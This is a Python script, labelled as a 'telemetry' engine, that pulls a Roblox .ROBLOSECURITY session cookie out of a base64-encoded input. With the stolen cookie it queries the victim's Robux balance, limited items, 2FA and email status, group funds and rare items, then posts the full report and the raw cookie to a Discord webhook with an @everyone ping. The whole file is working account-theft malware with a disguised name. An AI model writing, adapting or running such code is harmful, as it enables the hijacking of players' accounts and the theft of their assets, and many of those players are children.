import sys
import base64
import os
import requests
import re
from datetime import datetime, timezone

def safe_get(url, headers, default=None):
    try:
        res = requests.get(url, headers=headers, timeout=10)
        if res.status_code == 200:
            return res.json()
    except Exception:
        pass
    return default

def main():
    try:
        if len(sys.argv) < 2:
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception:
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return

        match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
        if not match:
            return

        roblosecurity = match.group(1)
        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        # 1. Authenticated User Info
        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        if not user_data:
            return

        username = user_data.get("name", "Unknown")
        user_id = user_data.get("id", 0)
        display_name = user_data.get("displayName", username)

        # 2. Account Age Calculation
        account_age_days = 0
        created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
        if created_str:
            try:
                created_dt = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                account_age_days = (datetime.now(timezone.utc) - created_dt).days
            except Exception:
                pass

        # 3. Economy (Robux & Pending)
        robux_balance = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers, {}).get("robux", 0)
        pending_robux = 0
        trans_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=10", headers, {}).get("data", [])
        for t in trans_data:
            cur = t.get("currency", {})
            if cur.get("amount"):
                pending_robux += cur.get("amount")

        # 4. Rolimons / Limiteds (RAP & Limiteds Count)
        rap = 0
        limiteds_count = 0
        rolimons_data = safe_get(f"https://www.rolimons.com/api/playeritems/{user_id}", {})
        if rolimons_data and rolimons_data.get("success"):
            player_assets = rolimons_data.get("playerAssets", {})
            limiteds_count = len(player_assets)
            # Rolimons stores item data as [value, rap, ...]; compute total RAP
            for asset_id, item_info in player_assets.items():
                if isinstance(item_info, list) and len(item_info) > 1:
                    rap += item_info[1]

        # 5. Settings (Email & 2FA)
        email_status = "Unverified"
        email_data = safe_get(f"https://users.roblox.com/v1/email", headers)
        if email_data and email_data.get("verified"):
            email_status = "Verified"

        two_step_enabled = "Not Set"
        tfa_data = safe_get(f"https://twostepverification.roblox.com/v1/users/{user_id}/configuration", headers)
        if tfa_data:
            if tfa_data.get("authenticatorEnabled") or tfa_data.get("emailEnabled"):
                two_step_enabled = "Enabled"

        # 6. Games & Developer Stats
        is_developer = False
        game_visits = 0
        created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
        if created_games:
            is_developer = True
            for g in created_games:
                game_visits += g.get("rootPlace", {}).get("visits", 0)

        # 7. Inventory Items (Korblox, Headless, Dominus)
        has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
        has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)
        
        # Fallback inventory checks for assets if bundle check returns false
        if not has_korblox:
            k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers, {})
            has_korblox = len(k_res.get("data", [])) > 0
        if not has_headless:
            h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers, {})
            has_headless = len(h_res.get("data", [])) > 0

        # 8. Groups Owned & Balance
        groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
        owned_groups_count = 0
        group_balance = 0
        for g in groups_data:
            role = g.get("role", {})
            if role.get("rank") == 255: # Owner rank
                owned_groups_count += 1
                gid = g.get("group", {}).get("id")
                g_currency = safe_get(f"https://economy.roblox.com/v1/groups/{gid}/currency", headers, {}).get("robux", 0)
                group_balance += g_currency

        # 9. Premium Status
        is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)

        # Avatar Thumbnail URL
        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

        # Constructing Discord Payload with @everyone Ping
        payload = {
            "content": "@everyone New Telemetry Report Captured!",
            "username": f"{username} | Telemetry Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Games Developer: `{str(is_developer)}`\n"
                    f"> • Game Visits: `{game_visits}`\n"
                    f"> • Group Memberships: `{len(groups_data)}`\n\n"
                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary**\n"
                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Total: `{robux_balance + rap}` 🪙\n"
                    f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                    f"💳 **Payments & Groups**\n"
                    f"> • Credit Balance: `0`\n"
                    f"> • Owned Groups: `{owned_groups_count}`\n"
                    f"> • Group Robux: `{group_balance}` 🪙\n\n"
                    f"⚙️ **Settings**\n"
                    f"> • Email: `{email_status}`\n"
                    f"> • 2FA: `{two_step_enabled}`\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                    f"🧿 **Tool Used**\n```text\nCopy-Clothes\n```\n"
                    f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "NexusStudio Telemetry Engine • 2026" }
            }]
        }

        requests.post(webhook_url, json=payload, timeout=10)

    except Exception:
        pass

if __name__ == "__main__":
    main()
